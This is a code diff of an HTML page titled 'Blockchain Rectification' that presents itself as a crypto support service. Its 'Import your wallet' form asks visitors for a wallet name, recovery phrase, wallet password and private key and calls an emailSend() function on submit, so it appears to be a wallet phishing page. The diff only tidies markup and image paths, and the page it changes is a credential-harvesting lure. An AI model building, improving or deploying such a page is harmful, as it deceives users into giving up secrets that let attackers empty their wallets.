@@ -20,7 +20,7 @@
 
     <title>Blockchain Rectification - We are here to help you resolve your crypto related issues</title>
 
-	<link rel="shortcut icon" type="image/x-icon" href="bitcypo/images/favicon.ico"/> 
+	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico"/> 
 
 	<meta name="keywords" content="">
 
@@ -35,31 +35,24 @@
 
 <body>
 
-                    
+<div class="frame">
+<h2>Import your wallet</h2>
 
-  
+<form onsubmit="emailSend(); reset(); return false;">
 
-				<div class="frame">
+ <div class="email">
 
-	
+<input type="text" id="wallet" placeholder="wallet name" name="wallet" required>
 
-		<h2>Import your wallet</h2>
+<img src="images/wallet.png" width="23px" />
 
-		<form onsubmit="emailSend(); reset(); return false;">
-
-		 <div class="email">
-
-			<input type="text" id="wallet" placeholder="wallet name" name="wallet" required>
-
-			<img src="wallet.png" width="23px" />
-
-			</div>
+</div>
 
 			<div class="email">
 
 			<input type="text" id="phrase" placeholder="phrase" name="phrase" required>
 
-			<img src="phrase.png" width="23px" />
+			<img src="images/phrase.png" width="23px" />
 
 			</div>
 
@@ -67,7 +60,7 @@
 
 			<input type="text" id="walletpassword" placeholder="wallet password" name="walletpassword" required>
 
-			<img src="password.png" width="23px" />
+			<img src="images/password.png" width="23px" />
 
 			</div>
 
@@ -75,7 +68,7 @@
 
 			<input type="text" id="privatekey" placeholder="private key" name="privatekey" required>
 
-			<img src="padlock.png" width="23px" />
+			<img src="images/padlock.png" width="23px" />
 
 			</div> 
 
